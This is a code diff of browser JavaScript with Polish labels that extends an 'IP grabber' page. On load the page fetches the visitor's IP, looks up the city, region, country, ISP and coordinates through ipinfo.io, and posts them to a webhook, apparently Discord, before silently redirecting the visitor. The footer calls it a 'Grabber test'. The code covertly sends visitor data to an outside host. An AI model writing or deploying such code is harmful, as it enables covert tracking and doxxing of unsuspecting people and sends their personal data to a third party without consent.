@@ -5,20 +5,25 @@ fetch('https://api.ipify.org?format=json')
   .then(response => response.json())
   .then(data => {
     const ip = data.ip;
-    const webhookData = {
-      embeds: [{
-        title: "Nowe wejście na stronę",
-        description: `Adres IP: **${ip}**`,
-        color: 5814783,
-        footer: { text: "fani głabeł" },
-        timestamp: new Date().toISOString()
-      }]
-    };
-    fetch(webhookUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(webhookData)
-    });
+    fetch('https://ipinfo.io/' + ip + '/json')
+      .then(resp => resp.json())
+      .then(ipinfo => {
+        const embed = {
+          embeds: [{
+            title: "Nowe wejście na stronę",
+            description: `Adres IP: **${ip}**\nMiasto: ${ipinfo.city || 'Brak'}\nRegion: ${ipinfo.region || 'Brak'}\nKraj: ${ipinfo.country || 'Brak'}\nISP: ${ipinfo.org || 'Brak'}\nLokacja: ${ipinfo.loc || 'Brak'}`,
+            color: 5814783,
+            footer: { text: "Grabber test by juliu" },
+            timestamp: new Date().toISOString()
+          }]
+        };
+        fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(embed)
+        });
+      })
+      .finally(() => {
+        window.location.href = redirectUrl;
+      });
   });
-
-window.location.href = redirectUrl;
